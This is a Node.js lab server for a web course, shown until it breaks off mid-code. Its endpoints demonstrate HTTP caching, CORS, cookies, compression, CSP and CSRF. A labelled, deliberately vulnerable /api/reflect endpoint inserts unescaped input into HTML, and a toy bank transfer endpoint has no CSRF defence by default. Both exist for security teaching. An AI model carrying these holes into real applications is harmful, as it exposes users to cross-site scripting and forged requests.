#!/usr/bin/env node
/**
 * server.mjs — the lab server for every course in this repo.
 *
 * It does two jobs:
 *
 *   1. Serve the repo as static files (so labs are plain files you can read).
 *   2. Expose /api/* endpoints whose HTTP behaviour you control from the query string:
 *      cache headers, validators, delays, CORS headers, cookies, redirects, failures.
 *
 * It listens on TWO ports so you have a real second origin without touching /etc/hosts:
 *
 *   http://localhost:8080   the app origin — open labs here
 *   http://localhost:8081   the "other" origin — cross-origin fetches, preconnect targets
 *
 * (http://127.0.0.1:8080 is also a third origin, since origin = scheme + host + port and
 *  "localhost" and "127.0.0.1" are different hosts. The CORS labs use all three.)
 *
 * No dependencies. Node 18+.
 *
 * Usage:  ./serve.sh   or   node server.mjs [appPort] [altPort]
 */
import http from 'node:http';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import zlib from 'node:zlib';
import crypto from 'node:crypto';
import { renderRoute, MODES, routeCache, cacheStats, invalidate } from './shared/app/render.mjs';
import * as appData from './shared/app/data.mjs';

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const APP_PORT = Number(process.argv[2] || 8080);
const ALT_PORT = Number(process.argv[3] || 8081);

// ---------------------------------------------------------------------------
// Server-side state
//
// Two things worth understanding here:
//
//   hits     — how many times a URL actually reached the server. This is the number
//              that proves a cache worked. If you reload and the counter does not move,
//              the browser answered from its own cache and the network never happened.
//   versions — a mutable "content version" per named asset, so you can change a resource
//              underneath a cache and watch validators (ETag / Last-Modified) do their job.
// ---------------------------------------------------------------------------

const hits = new Map();          // url path+query key -> count
const versions = new Map();      // asset name -> { v, mtime }
const log = [];                  // recent requests, for /api/log
const FROZEN_MTIME = new Date('2020-01-01T00:00:00Z');   // for /api/asset?freeze=1

function bump(key) {
  hits.set(key, (hits.get(key) || 0) + 1);
  return hits.get(key);
}

function version(name) {
  if (!versions.has(name)) versions.set(name, { v: 1, mtime: new Date() });
  return versions.get(name);
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.webp': 'image/webp',
  '.woff2': 'font/woff2',
  '.md': 'text/markdown; charset=utf-8',
  '.map': 'application/json; charset=utf-8',
  '.wasm': 'application/wasm',
  '.webmanifest': 'application/manifest+json; charset=utf-8',
  '.txt': 'text/plain; charset=utf-8',
};

function num(q, key, dflt = 0) {
  const v = Number(q.get(key));
  return Number.isFinite(v) && q.has(key) ? v : dflt;
}

function bool(q, key, dflt = false) {
  if (!q.has(key)) return dflt;
  const v = q.get(key);
  return v !== '0' && v !== 'false' && v !== 'no';
}

/** Deterministic filler so response sizes are controllable but compressible-ish. */
function filler(bytes) {
  if (bytes <= 0) return '';
  const unit = 'the quick brown fox jumps over the lazy dog. ';
  return unit.repeat(Math.ceil(bytes / unit.length)).slice(0, bytes);
}

function send(res, status, headers, body) {
  res.writeHead(status, headers);
  if (body === undefined || res.req?.method === 'HEAD') res.end();
  else res.end(body);
}

function json(res, obj, status = 200, extra = {}) {
  const body = JSON.stringify(obj, null, 2);
  send(res, status, {
    'content-type': 'application/json; charset=utf-8',
    'content-length': Buffer.byteLength(body),
    'cache-control': 'no-store',
    'access-control-allow-origin': '*',
    ...extra,
  }, body);
}

// ---------------------------------------------------------------------------
// /api/asset — the HTTP-caching workhorse
//
// Everything about the response is yours to set:
//
//   ?name=app            identity; also the key for /api/bump and the hit counter
//   &type=js|css|json|txt|svg
//   &cc=max-age%3D60     raw Cache-Control (URL-encode the '=' as %3D or just use '=')
//   &etag=1              send a strong ETag derived from name+version, honour If-None-Match
//   &weak=1              make that ETag weak (W/"...")
//   &lm=1                send Last-Modified, honour If-Modified-Since
//   &vary=Accept         send a Vary header
//   &age=30              send an Age header (pretend a CDN held it this long)
//   &delay=500           server think-time in ms, before the first byte
//   &size=20000          pad the body to roughly this many bytes
//   &status=200          force a status code
//   &cors=1              add Access-Control-Allow-Origin: *
// ---------------------------------------------------------------------------

async function apiAsset(req, res, url) {
  const q = url.searchParams;
  const name = q.get('name') || 'asset';
  const type = q.get('type') || 'json';
  const state = version(name);
  const key = `asset:${name}`;
  const count = bump(key);

  await sleep(num(q, 'delay', 0));

  // `freeze=1` pins the validators to version 1 while the body keeps changing — i.e. a server
  // that lies about whether its content changed. This is how caches get poisoned, and it is a
  // real bug you will meet (templating engines that ETag the template, not the output).
  const frozen = bool(q, 'freeze');
  const validatorVersion = frozen ? 1 : state.v;
  const etagBase = `"${name}-v${validatorVersion}"`;
  const etag = bool(q, 'weak') ? `W/${etagBase}` : etagBase;
  const validatorMtime = frozen ? FROZEN_MTIME : state.mtime;
  const lastModified = validatorMtime.toUTCString();

  const headers = {};
  if (q.has('cc')) headers['cache-control'] = q.get('cc');
  if (bool(q, 'etag')) headers['etag'] = etag;
  if (bool(q, 'lm')) headers['last-modified'] = lastModified;
  if (q.has('vary')) headers['vary'] = q.get('vary');
  if (q.has('age')) headers['age'] = String(num(q, 'age'));
  if (bool(q, 'cors', true)) headers['access-control-allow-origin'] = '*';
  headers['x-served-at'] = new Date().toISOString();
  headers['x-server-hits'] = String(count);
  headers['x-asset-version'] = String(state.v);

  // Conditional request handling — this is the whole point of validators.
  const inm = req.headers['if-none-match'];
  const ims = req.headers['if-modified-since'];
  const etagMatches = inm && inm.split(',').some((t) => t.trim().replace(/^W\//, '') === etagBase);
  const notModifiedByDate = ims && bool(q, 'lm') &&
    new Date(ims).getTime() >= Math.floor(validatorMtime.getTime() / 1000) * 1000;

  if ((bool(q, 'etag') && etagMatches) || (!inm && notModifiedByDate)) {
    // 304 carries no body but MAY refresh caching headers.
    return send(res, 304, headers);
  }

  // `echoHeader=x-lang` makes the BODY depend on a request header — which is exactly when you
  // are obliged to send a matching `Vary`. Omit the Vary and you have built a cache-poisoning
  // bug you can watch happen (Lab 05).
  const echoed = q.has('echoHeader')
    ? (req.headers[q.get('echoHeader').toLowerCase()] ?? '(header absent)')
    : null;
  if (echoed !== null) headers['x-echoed-request-header'] = String(echoed).slice(0, 120);

  const payload = {
    js: `/* ${name} v${state.v} — served ${new Date().toISOString()} */
(globalThis.__loaded ||= []).push({ name: ${JSON.stringify(name)}, v: ${state.v}, at: performance.now() });
globalThis.dispatchEvent(new CustomEvent('lab:asset', { detail: { name: ${JSON.stringify(name)}, v: ${state.v} } }));
`,
    css: `/* ${name} v${state.v} */\n:root { --${name.replace(/\W/g, '')}-version: "${state.v}"; }\n`,
    svg: `<svg xmlns="http://www.w3.org/2000/svg" width="240" height="120"><rect width="240" height="120" fill="#1c2440"/><text x="12" y="64" fill="#7c9cff" font-family="monospace" font-size="16">${name} v${state.v}</text></svg>`,
    txt: `${name} v${state.v}${echoed !== null ? ` echo=${echoed}` : ''}\n`,
    json: JSON.stringify({
      name,
      version: state.v,
      servedAt: new Date().toISOString(),
      serverHits: count,
      ...(echoed !== null ? { echo: echoed } : {}),
    }),
  }[type] ?? '';

  const pad = num(q, 'size', 0);
  const body = pad > payload.length
    ? (type === 'json'
      ? JSON.stringify({ ...JSON.parse(payload), pad: filler(pad - payload.length - 12) })
      : payload + (type === 'css' ? `\n/* ${filler(pad - payload.length)} */` : `\n// ${filler(pad - payload.length)}`))
    : payload;

  headers['content-type'] = { js: MIME['.js'], css: MIME['.css'], svg: MIME['.svg'], txt: 'text/plain; charset=utf-8', json: MIME['.json'] }[type];
  headers['content-length'] = Buffer.byteLength(body);

  send(res, num(q, 'status', 200), headers, body);
}

// ---------------------------------------------------------------------------
// /api/cors — a deliberately unhelpful CORS endpoint you configure by hand.
//
//   ?acao=*                  Access-Control-Allow-Origin (use 'echo' to mirror the Origin)
//   &acam=GET,PUT            Access-Control-Allow-Methods (preflight response)
//   &acah=content-type       Access-Control-Allow-Headers (preflight response)
//   &acac=1                  Access-Control-Allow-Credentials: true
//   &expose=x-total-count    Access-Control-Expose-Headers
//   &maxage=600              Access-Control-Max-Age
//   &preflightStatus=204     status for the OPTIONS response
//   &preflightDelay=300      ms of delay on the OPTIONS response
//   &delay=0                 ms of delay on the actual response
//   &status=200              status for the actual response
//
// Omit a param and the header is simply absent — which is exactly how real CORS bugs look.
// ---------------------------------------------------------------------------

function corsHeaders(q, req, forPreflight) {
  const h = {};
  const acao = q.get('acao');
  if (acao) h['access-control-allow-origin'] = acao === 'echo' ? (req.headers.origin || '*') : acao;
  if (bool(q, 'acac')) h['access-control-allow-credentials'] = 'true';
  if (q.has('expose')) h['access-control-expose-headers'] = q.get('expose');
  if (q.has('vary')) h['vary'] = q.get('vary');
  if (forPreflight) {
    if (q.has('acam')) h['access-control-allow-methods'] = q.get('acam');
    if (q.has('acah')) h['access-control-allow-headers'] = q.get('acah');
    if (q.has('maxage')) h['access-control-max-age'] = q.get('maxage');
  }
  return h;
}

async function apiCors(req, res, url) {
  const q = url.searchParams;
  const preflight = req.method === 'OPTIONS';
  bump(`cors:${preflight ? 'preflight' : req.method}`);

  if (preflight) {
    await sleep(num(q, 'preflightDelay', 0));
    if (q.has('preflightRedirect')) {
      return send(res, 302, { location: q.get('preflightRedirect') });
    }
    return send(res, num(q, 'preflightStatus', 204), {
      ...corsHeaders(q, req, true),
      'content-length': 0,
    });
  }

  await sleep(num(q, 'delay', 0));

  // `noActualCors=1` sends CORS headers on the preflight but NOT on the real response — the
  // classic "my OPTIONS is fine, why is it still blocked" configuration.
  const actualCors = bool(q, 'noActualCors') ? {} : corsHeaders(q, req, false);

  const body = JSON.stringify({
    ok: true,
    method: req.method,
    origin: req.headers.origin ?? null,
    sawCookie: req.headers.cookie ?? null,
    requestHeaders: req.headers,
    note: 'If you can read this in JS, CORS allowed it. If not, the response still arrived — the browser just refused to hand it to you.',
  }, null, 2);

  send(res, num(q, 'status', 200), {
    'content-type': MIME['.json'],
    'cache-control': 'no-store',
    'x-total-count': '42',
    'x-request-id': 'req_' + Math.random().toString(36).slice(2, 10),
    ...actualCors,
    'content-length': Buffer.byteLength(body),
  }, body);
}

// ---------------------------------------------------------------------------
// Cookies, for the credentials labs.
// ---------------------------------------------------------------------------

function apiSetCookie(req, res, url) {
  const q = url.searchParams;
  const name = q.get('name') || 'lab_session';
  const value = q.get('value') || 'abc123';
  const sameSite = q.get('samesite') || 'Lax';       // Strict | Lax | None
  const parts = [`${name}=${value}`, 'Path=/', `SameSite=${sameSite}`, 'Max-Age=3600'];
  if (bool(q, 'httponly', true)) parts.push('HttpOnly');
  if (bool(q, 'secure', sameSite.toLowerCase() === 'none')) parts.push('Secure');

  json(res, {
    set: parts.join('; '),
    hint: 'SameSite=None requires Secure. http://localhost counts as a secure context in Chrome, so it works here but would not on plain http on a real host.',
  }, 200, {
    'set-cookie': parts.join('; '),
    ...corsHeaders(url.searchParams, req, false),
    'access-control-allow-origin': url.searchParams.get('acao') === 'echo'
      ? (req.headers.origin || '*') : (url.searchParams.get('acao') || '*'),
  });
}

function apiWhoami(req, res, url) {
  const q = url.searchParams;
  if (req.method === 'OPTIONS') {
    return send(res, 204, { ...corsHeaders(q, req, true), 'content-length': 0 });
  }
  const cookie = req.headers.cookie || '';
  json(res, {
    authenticated: cookie.includes('lab_session='),
    cookieHeaderSeen: cookie || null,
    origin: req.headers.origin ?? null,
  }, 200, corsHeaders(q, req, false));
}

// ---------------------------------------------------------------------------
// Timing / waterfall endpoints, for the resource-hint and worker labs.
// ---------------------------------------------------------------------------

async function apiSlow(req, res, url, kind) {
  const q = url.searchParams;
  const name = q.get('name') || kind;
  bump(`slow:${name}`);
  await sleep(num(q, 'delay', 300));

  const bodies = {
    js: `(globalThis.__loaded ||= []).push({ name: ${JSON.stringify(name)}, at: performance.now() });\n` +
        (q.has('then') ? `import(${JSON.stringify(q.get('then'))});\n` : '') +
        `// ${filler(num(q, 'size', 0))}`,
    css: `.hint-${name.replace(/\W/g, '')} { --loaded: 1; }\n` +
         (q.has('img') ? `#hero { background-image: url(${JSON.stringify(q.get('img'))}); }\n` : '') +
         `/* ${filler(num(q, 'size', 0))} */`,
  };
  const body = bodies[kind];
  send(res, 200, {
    'content-type': kind === 'js' ? MIME['.js'] : MIME['.css'],
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
    'content-length': Buffer.byteLength(body),
  }, body);
}

async function apiImage(req, res, url) {
  const q = url.searchParams;
  bump(`img:${q.get('name') || 'img'}`);
  await sleep(num(q, 'delay', 300));
  const w = num(q, 'w', 600), h = num(q, 'h', 300);
  const label = q.get('label') || `${w}×${h}`;
  const body = `<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}" viewBox="0 0 ${w} ${h}">
  <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
    <stop offset="0" stop-color="#233a6d"/><stop offset="1" stop-color="#5b2f6d"/></linearGradient></defs>
  <rect width="${w}" height="${h}" fill="url(#g)"/>
  <text x="24" y="${h / 2}" fill="#cdd6ff" font-family="monospace" font-size="${Math.round(h / 8)}">${label}</text>
  <!-- ${filler(num(q, 'size', 0))} -->
</svg>`;
  send(res, 200, {
    'content-type': MIME['.svg'],
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
    'content-length': Buffer.byteLength(body),
  }, body);
}

/** A chunk of realistic-ish JSON rows. Big enough that parsing it costs real time. */
async function apiRows(req, res, url) {
  const q = url.searchParams;
  const n = Math.min(num(q, 'n', 20000), 400000);
  bump('rows');
  await sleep(num(q, 'delay', 0));

  const FIRST = ['ada', 'grace', 'alan', 'linus', 'barbara', 'edsger', 'donald', 'radia'];
  const LAST = ['lovelace', 'hopper', 'turing', 'torvalds', 'liskov', 'dijkstra', 'knuth', 'perlman'];
  const rows = new Array(n);
  for (let i = 0; i < n; i++) {
    rows[i] = {
      id: i,
      name: `${FIRST[i % FIRST.length]}.${LAST[(i * 7) % LAST.length]}`,
      team: `team-${i % 37}`,
      score: ((i * 2654435761) % 100000) / 100,
      active: i % 3 !== 0,
      tags: [`t${i % 11}`, `t${i % 19}`],
      updatedAt: new Date(1700000000000 + i * 1000).toISOString(),
    };
  }
  const body = JSON.stringify({ count: n, rows });
  const headers = {
    'content-type': MIME['.json'],
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
  };
  if (bool(q, 'gzip', true) && /\bgzip\b/.test(req.headers['accept-encoding'] || '')) {
    const gz = zlib.gzipSync(body);
    headers['content-encoding'] = 'gzip';
    headers['content-length'] = gz.length;
    return send(res, 200, headers, gz);
  }
  headers['content-length'] = Buffer.byteLength(body);
  send(res, 200, headers, body);
}

/**
 * /api/font — serve a real font file with a configurable delay, so the font-loading labs can
 * observe FOIT/FOUT timelines. Files live in asset-optimization/fonts/ (run make-fonts.mjs).
 */
async function apiFont(req, res, url) {
  const q = url.searchParams;
  const name = (q.get('name') || 'inter-400').replace(/[^a-z0-9-]/gi, '');
  const file = path.join(ROOT, 'asset-optimization', 'fonts', `${name}.woff2`);
  bump(`font:${name}`);
  await sleep(num(q, 'delay', 0));

  if (!fs.existsSync(file)) {
    // No font available: return a 404 AFTER the delay. The block/swap timeline is still
    // observable (the browser does not know the request will fail until it does), which is
    // most of what the lab is teaching.
    return send(res, 404, { 'content-type': 'text/plain', 'cache-control': 'no-store' },
      'no font file — run: node asset-optimization/make-fonts.mjs\n');
  }
  const buf = fs.readFileSync(file);
  send(res, 200, {
    'content-type': 'font/woff2',
    'cache-control': q.get('cc') || 'no-store',
    // Fonts are always fetched in CORS mode, so this matters even same-origin-ish.
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
    'content-length': buf.length,
  }, buf);
}

/** Binary-ish payload of a given size in MB, for storage/quota labs. */
async function apiBlob(req, res, url) {
  const q = url.searchParams;
  const mb = Math.min(num(q, 'mb', 1), 64);
  bump('blob');
  await sleep(num(q, 'delay', 0));
  const buf = Buffer.alloc(mb * 1024 * 1024, 'lab-payload-');
  send(res, 200, {
    'content-type': 'application/octet-stream',
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'content-length': buf.length,
  }, buf);
}

/**
 * /api/text — a text payload with a chosen content-encoding, for the compression lab.
 *
 *   ?bytes=100000&encoding=gzip|br|identity&kind=text|json|already-compressed
 *
 * Compression is applied here explicitly (rather than by a middleware) so the lab can compare
 * encodings on identical bytes and time the CPU cost of each.
 */
async function apiText(req, res, url) {
  const q = url.searchParams;
  const bytes = Math.min(num(q, 'bytes', 100000), 20 * 1024 * 1024);
  const kind = q.get('kind') || 'text';
  bump(`text:${kind}`);

  let body;
  if (kind === 'json') {
    const n = Math.max(1, Math.round(bytes / 120));
    body = JSON.stringify(Array.from({ length: n }, (_, i) => ({
      id: i, name: `record ${i}`, status: 'active', createdAt: '2026-01-01T00:00:00Z',
    })));
  } else if (kind === 'random') {
    // Incompressible: already-compressed data (an image, a zip) looks like this to gzip.
    const buf = Buffer.alloc(bytes);
    for (let i = 0; i < bytes; i++) buf[i] = (i * 2654435761) & 0xff;
    body = buf;
  } else {
    body = Buffer.from(filler(bytes));
  }
  const raw = Buffer.isBuffer(body) ? body : Buffer.from(body);

  const encoding = q.get('encoding') || 'identity';
  const t0 = performance.now();
  let out = raw;
  if (encoding === 'gzip') out = zlib.gzipSync(raw, { level: num(q, 'level', 6) });
  else if (encoding === 'br') out = zlib.brotliCompressSync(raw, {
    params: { [zlib.constants.BROTLI_PARAM_QUALITY]: num(q, 'level', 5) },
  });
  else if (encoding === 'deflate') out = zlib.deflateSync(raw);
  const encodeMs = performance.now() - t0;

  const headers = {
    'content-type': kind === 'json' ? MIME['.json'] : 'text/plain; charset=utf-8',
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
    'content-length': out.length,
    'x-uncompressed-length': raw.length,
    'x-encode-ms': encodeMs.toFixed(2),
    'server-timing': `encode;dur=${encodeMs.toFixed(2)}`,
  };
  if (encoding !== 'identity') headers['content-encoding'] = encoding;
  headers.vary = 'Accept-Encoding';
  send(res, 200, headers, out);
}

/**
 * /api/edge — a toy CDN in front of any other lab endpoint.
 *
 *   ?path=/api/asset?name=x&type=json&delay=800&ttl=10&pop=lhr
 *
 * Caches by path + pop, reports HIT/MISS/EXPIRED and an Age header, and can be purged. Enough
 * to reason about edge caching without needing an actual CDN account.
 */
const edgeCache = new Map();          // `${pop}|${path}` -> { body, headers, storedAt }

async function apiEdge(req, res, url) {
  const q = url.searchParams;
  const target = q.get('path') || '/api/asset?name=edge&type=json&delay=500';
  const pop = q.get('pop') || 'lhr';
  const ttl = num(q, 'ttl', 10);
  const key = `${pop}|${target}`;

  if (bool(q, 'purge')) {
    const purged = [...edgeCache.keys()].filter((k) => k.endsWith(`|${target}`));
    for (const k of purged) edgeCache.delete(k);
    return json(res, { purged: purged.length, pops: purged.map((k) => k.split('|')[0]) });
  }
  if (bool(q, 'stats')) {
    return json(res, {
      entries: [...edgeCache.entries()].map(([k, v]) => ({
        key: k, ageSec: Math.round((Date.now() - v.storedAt) / 1000), bytes: v.body.length,
      })),
    });
  }

  const hit = edgeCache.get(key);
  const ageSec = hit ? (Date.now() - hit.storedAt) / 1000 : Infinity;

  if (hit && ageSec < ttl) {
    bump(`edge:hit:${pop}`);
    // A real POP is close to the user, so a hit is fast wherever the origin is.
    await sleep(num(q, 'popRtt', 10));
    return send(res, 200, {
      ...hit.headers,
      'x-cache': 'HIT',
      'x-cache-pop': pop,
      age: String(Math.round(ageSec)),
      'access-control-allow-origin': '*',
    }, hit.body);
  }

  bump(`edge:miss:${pop}`);
  const originStart = performance.now();
  const originRes = await fetch(`http://localhost:${APP_PORT}${target.startsWith('/') ? '' : '/'}${target}`);
  const body = Buffer.from(await originRes.arrayBuffer());
  const originMs = performance.now() - originStart;

  const headers = {
    'content-type': originRes.headers.get('content-type') || 'application/octet-stream',
    'cache-control': `public, max-age=${ttl}`,
    'content-length': body.length,
  };
  edgeCache.set(key, { body, headers, storedAt: Date.now() });

  send(res, 200, {
    ...headers,
    'x-cache': hit ? 'EXPIRED' : 'MISS',
    'x-cache-pop': pop,
    'x-origin-ms': originMs.toFixed(1),
    age: '0',
    'access-control-allow-origin': '*',
  }, body);
}

/** Fails on demand — for network-first fallbacks, stale-if-error, retry logic. */
async function apiFlaky(req, res, url) {
  const q = url.searchParams;
  const n = bump('flaky');
  await sleep(num(q, 'delay', 0));
  const failEvery = num(q, 'failEvery', 2);
  const forced = q.has('fail') && bool(q, 'fail');
  const shouldFail = forced || (failEvery > 0 && n % failEvery === 0);
  if (shouldFail) {
    const body = JSON.stringify({ error: 'upstream exploded', attempt: n });
    return send(res, num(q, 'errorStatus', 503), {
      'content-type': MIME['.json'],
      'cache-control': q.get('cc') || 'no-store',
      'access-control-allow-origin': '*',
      'content-length': Buffer.byteLength(body),
    }, body);
  }
  const body = JSON.stringify({ ok: true, attempt: n, servedAt: new Date().toISOString() });
  send(res, 200, {
    'content-type': MIME['.json'],
    'cache-control': q.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'content-length': Buffer.byteLength(body),
  }, body);
}

/** Redirect chains: /api/redirect?n=3&to=/api/asset */
function apiRedirect(req, res, url) {
  const q = url.searchParams;
  const n = num(q, 'n', 1);
  bump('redirect');
  const to = n > 1
    ? `/api/redirect?n=${n - 1}&to=${encodeURIComponent(q.get('to') || '/api/asset?name=end&type=json')}`
    : (q.get('to') || '/api/asset?name=end&type=json');
  send(res, num(q, 'status', 302), {
    location: to,
    'access-control-allow-origin': '*',
    'cache-control': 'no-store',
    'content-length': 0,
  });
}

/**
 * /api/probe — a server-side `curl` you can call from a page.
 *
 * CORS hides the failing response from JavaScript by design, so the only honest way to debug
 * is to look at the raw exchange. This does that: it performs the request from Node (where no
 * same-origin policy applies) and returns the status and every response header as JSON.
 *
 *   /api/probe?url=http://localhost:8081/api/cors&method=OPTIONS
 *              &origin=http://localhost:8080&acrm=PUT&acrh=x-token
 *
 * Restricted to localhost targets — this is a lab, not an open proxy.
 */
async function apiProbe(req, res, url) {
  const q = url.searchParams;
  const target = q.get('url');
  if (!target) return json(res, { error: 'pass ?url=' }, 400);

  let parsed;
  try {
    parsed = new URL(target);
  } catch {
    return json(res, { error: 'bad url' }, 400);
  }
  if (!['localhost', '127.0.0.1', '::1'].includes(parsed.hostname)) {
    return json(res, { error: 'probe is restricted to localhost targets' }, 403);
  }

  const method = (q.get('method') || 'OPTIONS').toUpperCase();
  const headers = { origin: q.get('origin') || `http://localhost:${APP_PORT}` };
  if (q.has('acrm')) headers['access-control-request-method'] = q.get('acrm');
  if (q.has('acrh')) headers['access-control-request-headers'] = q.get('acrh');
  if (q.has('cookie')) headers.cookie = q.get('cookie');

  try {
    const r = await fetch(target, { method, headers, redirect: 'manual' });
    const text = await r.text();
    json(res, {
      request: { method, url: target, headers },
      status: r.status,
      statusText: r.statusText,
      headers: Object.fromEntries(r.headers.entries()),
      bodyPreview: text.slice(0, 400),
    });
  } catch (err) {
    json(res, { error: String(err) }, 502);
  }
}

/**
 * /api/reflect — a deliberately unsafe endpoint, for the security course.
 *
 * It reflects a query parameter into an HTML response four ways, so the labs can show what
 * escaping and sanitisation actually prevent. It exists only on this localhost-bound lab server
 * and is not a pattern to copy — the whole point is to see the vulnerable version fail and the
 * safe versions hold.
 *
 *   ?mode=raw|attr|escaped|sanitized|textnode&input=...
 */
function apiReflect(req, res, url) {
  const q = url.searchParams;
  const mode = q.get('mode') || 'escaped';
  const input = q.get('input') ?? '';
  bump(`reflect:${mode}`);

  const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

  // A deliberately small allow-list sanitiser. Real code should use DOMPurify; this exists so
  // the lab can show the SHAPE of a sanitiser (allow-list, not deny-list) and why a deny-list
  // loses.
  const sanitize = (html) => {
    const allowedTags = /^(b|i|em|strong|p|br|ul|ol|li|code)$/i;
    return String(html).replace(/<\/?([a-z0-9]+)((?:\s[^>]*)?)>/gi, (match, tag, attrs) => {
      if (!allowedTags.test(tag)) return '';
      // Attributes are dropped entirely: that is what removes onerror=, href=javascript:, style=.
      return match.startsWith('</') ? `</${tag.toLowerCase()}>` : `<${tag.toLowerCase()}>`;
    });
  };

  const bodies = {
    raw: `<div id="out">${input}</div>`,
    attr: `<div id="out" title="${input}">hover me — the input is in an attribute</div>`,
    escaped: `<div id="out">${escapeHtml(input)}</div>`,
    sanitized: `<div id="out">${sanitize(input)}</div>`,
    textnode: `<div id="out"></div><script>
      document.getElementById('out').textContent = ${JSON.stringify(input)};
    </script>`,
  };

  const html = `<!doctype html><meta charset="utf-8">
<link rel="stylesheet" href="/shared/lab.css">
<body style="padding:14px">
<p class="hint">mode: <b>${escapeHtml(mode)}</b> — this frame is the "vulnerable app"</p>
${bodies[mode] ?? bodies.escaped}
</body>`;

  const headers = {
    'content-type': 'text/html; charset=utf-8',
    'cache-control': 'no-store',
  };
  if (q.has('csp')) headers['content-security-policy'] = q.get('csp');
  send(res, 200, headers, html);
}

/**
 * /api/csp-page — a target document full of probes, for the CSP lab.
 *
 * You hand it a policy; it renders a page that tries seven things a real app does (inline script,
 * external script, eval, styles, images, fetch) and posts the result of each to its parent. That
 * turns "what does this policy break?" from a guess into a measurement.
 *
 *   ?policy=<csp>          sent as Content-Security-Policy
 *   ?ro=<csp>              sent as Content-Security-Policy-Report-Only
 *   ?nonce=1               generate a nonce, put it on ONE inline script, and substitute the
 *                          literal token NONCE in the policy with 'nonce-<value>'
 */
function apiCspPage(req, res, url) {
  const q = url.searchParams;
  const nonce = q.has('nonce') ? crypto.randomBytes(12).toString('base64') : null;
  const sub = (p) => (p && nonce ? p.replaceAll('NONCE', `'nonce-${nonce}'`) : p);
  const nonceAttr = nonce ? ` nonce="${nonce}"` : '';

  const html = `<!doctype html><meta charset="utf-8">
<link rel="stylesheet" href="/shared/lab.css">
<style>body{padding:12px;font:12px/1.6 var(--mono)}#probe{color:#7ee787}</style>
<body>
<p class="hint">probe page — policy applied by the server</p>
<div id="probe">running…</div>
<img id="xo" src="http://localhost:8081/api/image.svg" width="1" height="1" alt="">
<script${nonceAttr}>
  window.__p = { 'inline script (nonce)': false, 'inline script (no nonce)': false,
    'eval()': false, 'external script (same-origin)': false,
    'external script (cross-origin)': false, 'inline style': false,
    'image (cross-origin)': false, 'fetch (cross-origin)': false };
  window.__p['inline script (nonce)'] = true;
  window.__v = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    window.__v.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI).slice(0, 60),
      disposition: e.disposition, sample: (e.sample || '').slice(0, 40) });
  });
  try { window.__p['eval()'] = eval('1+1') === 2; } catch (e) {}
  document.getElementById('xo').onload = () => { window.__p['image (cross-origin)'] = true; };
  fetch('http://localhost:8081/api/echo')
    .then(() => { window.__p['fetch (cross-origin)'] = true; }).catch(() => {});
  setTimeout(() => {
    const el = document.createElement('div');
    el.setAttribute('style', 'color: rgb(1, 2, 3)');
    document.body.append(el);
    window.__p['inline style'] = getComputedStyle(el).color === 'rgb(1, 2, 3)';
    document.getElementById('probe').textContent =
      Object.entries(window.__p).filter(([, v]) => v).map(([k]) => k).join(', ') || 'everything blocked';
    parent.postMessage({ probe: window.__p, violations: window.__v }, '*');
  }, 700);
</script>
<script>window.__p['inline script (no nonce)'] = true;</script>
<script src="/api/csp-probe.js?flag=external%20script%20(same-origin)"></script>
<script src="http://localhost:8081/api/csp-probe.js?flag=external%20script%20(cross-origin)"></script>
</body>`;

  const headers = { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' };
  if (q.get('policy')) headers['content-security-policy'] = sub(q.get('policy'));
  if (q.get('ro')) headers['content-security-policy-report-only'] = sub(q.get('ro'));
  send(res, 200, headers, html);
}

/** A one-line script that flips a flag, so "did this script run?" is observable. */
function apiCspProbe(req, res, url) {
  const flag = JSON.stringify(url.searchParams.get('flag') ?? 'unknown');
  send(res, 200, { 'content-type': 'text/javascript', 'cache-control': 'no-store',
    'access-control-allow-origin': '*' }, `window.__p[${flag}] = true;`);
}

/**
 * /api/csrf — a toy bank, for the CSRF lab.
 *
 * The vulnerability is not in this code; it is in the browser's willingness to attach your cookies
 * to a request another site caused. So the endpoint is deliberately plain, and the DEFENCE is a
 * switch you flip:
 *
 *   ?action=login&samesite=Lax|Strict|None   authenticate, and choose the cookie's SameSite
 *   ?action=config&defense=none|token|origin  choose the server-side defence
 *   ?action=state                             balance, defence, and the ledger
 *   ?action=transfer&to=&amount=              the mutation an attacker wants to cause
 */
const bank = { balance: 1000, defense: 'none', ledger: [] };

function readBody(req) {
  return new Promise((resolve) => {
    let b = '';
    req.on('data', (c) => { b += c; });
    req.on('end', () => resolve(b));
  });
}

async function apiCsrf(req, res, url) {
  const q = url.searchParams;
  const action = q.get('action') || 'state';
  const cookies = Object.fromEntries((req.headers.cookie || '').split(';')
    .map((c) => c.trim().split('=')).filter((p) => p[0]));
  const appOrigin = `http://localhost:${APP_PORT}`;

  if (action === 'login') {
    const sameSite = q.get('samesite') || 'Lax';
    const token = crypto.randomBytes(12).toString('hex');
    bank.balance = 1000;
    bank.ledger = [];
    const attrs = `Path=/; SameSite=${sameSite}${sameSite.toLowerCase() === 'none' ? '; Secure' : ''}`;
    return json(res, { ok: true, sameSite, token, balance: bank.balance }, 200, {
      'set-cookie': [
